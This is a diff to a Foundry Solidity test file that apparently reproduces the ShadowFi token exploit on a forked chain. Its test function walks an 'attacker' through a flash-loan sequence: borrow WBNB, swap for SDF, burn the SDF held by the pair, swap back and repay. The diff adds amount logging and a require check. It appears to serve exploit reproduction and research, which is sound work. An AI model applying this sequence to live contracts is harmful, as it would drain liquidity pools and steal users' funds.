@@ -191,20 +191,30 @@ contract ShadowFiTestBase is Test, BlockLoader {
     function test_gt() public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
+        emit log_named_uint("amt0", 1e16);
         borrow_wbnb_owner(1e16);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 1e16);
+        emit log_named_uint("amt2", pair.getAmountOut(1e16, address(wbnb)));
         swap_pair_attacker_wbnb_sdf(
             1e16,
             pair.getAmountOut(1e16, address(wbnb))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", sdf.balanceOf(address(pair)) - 1);
         burn_sdf_pair(sdf.balanceOf(address(pair)) - 1);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", sdf.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(sdf.balanceOf(attacker), address(sdf))
+        );
         swap_pair_attacker_sdf_wbnb(
             sdf.balanceOf(attacker),
             pair.getAmountOut(sdf.balanceOf(attacker), address(sdf))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (1e16 * 1003) / 1000);
         payback_wbnb_owner((1e16 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -228,7 +238,7 @@ contract ShadowFiTestBase is Test, BlockLoader {
         burn_sdf_pair(amt3);
         swap_pair_attacker_sdf_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
